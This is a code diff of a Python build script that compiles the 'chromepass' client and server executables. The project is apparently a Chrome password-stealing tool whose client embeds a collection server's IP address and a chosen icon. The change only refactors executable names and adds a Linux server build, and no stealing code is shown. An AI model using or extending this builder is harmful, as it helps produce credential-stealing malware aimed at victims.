@@ -69,6 +69,7 @@ def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", e
     temp_path = f"{template_dir}/{filename}"
     build_path = f"{template_dir}/{chromepass_base}/src/main.rs"
     build_command = f"{refresh_env}cd {template_dir}\\{chromepass_base}; cargo build --release;"
+    executable_name = "chromepass.exe"
     if os.path.exists(temp_path) and not nobuild:
         print("[+] Building Client")
         shutil.copyfile(f"{icon_dir}/{icon}",
@@ -88,9 +89,9 @@ def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", e
             f.write(content)
         if compile_client(build_command):
             shutil.copyfile(
-                f"{template_dir}/{chromepass_base}/target/release/chromepass.exe", f"{dist_dir}/{filename}.exe")
+                f"{template_dir}/{chromepass_base}/target/release/{executable_name}", f"{dist_dir}/{filename}.exe")
             os.remove(
-                f"{template_dir}/{chromepass_base}/target/release/chromepass.exe")
+                f"{template_dir}/{chromepass_base}/target/release/{executable_name}")
             print("[+] Client build Successful")
             return True
     else:
@@ -112,17 +113,20 @@ def build_server(filename="server", icon="server.ico", port=80, nobuild=True, li
         nightly = f"{refresh_env}rustup default nightly"
         musl_target = f"{refresh_env}rustup target add x86_64-unknown-linux-musl"
         build_command = f"{refresh_env}cd {template_dir}\\{chromepass_server};{nightly};{musl_target};cargo build --release --target x86_64-unknown-linux-musl"
+        executable_name = "chromepass-server"
     else:
         build_command = f"{refresh_env}cd {template_dir}\\{chromepass_server}; cargo build --release;"
+        executable_name = "chromepass-server.exe"
     if os.path.exists(temp_path) and not nobuild:
         print("[+] Building Server")
-        shutil.copyfile(f"{icon_dir}/{icon}",
-                        f"{template_dir}/{chromepass_server}/server.ico")
+        if not linux:
+            shutil.copyfile(f"{icon_dir}/{icon}",
+                            f"{template_dir}/{chromepass_server}/server.ico")
         if compile_client(build_command):
             shutil.copyfile(
-                f"{template_dir}/{chromepass_server}/target/release/chromepass-server.exe", f"{dist_dir}/{filename}.exe")
+                f"{template_dir}/{chromepass_server}/target/release/{executable_name}", f"{dist_dir}/{filename}.exe")
             os.remove(
-                f"{template_dir}/{chromepass_server}/target/release/chromepass-server.exe")
+                f"{template_dir}/{chromepass_server}/target/release/{executable_name}")
             print("[+] Server build successful")
             return True
     else:
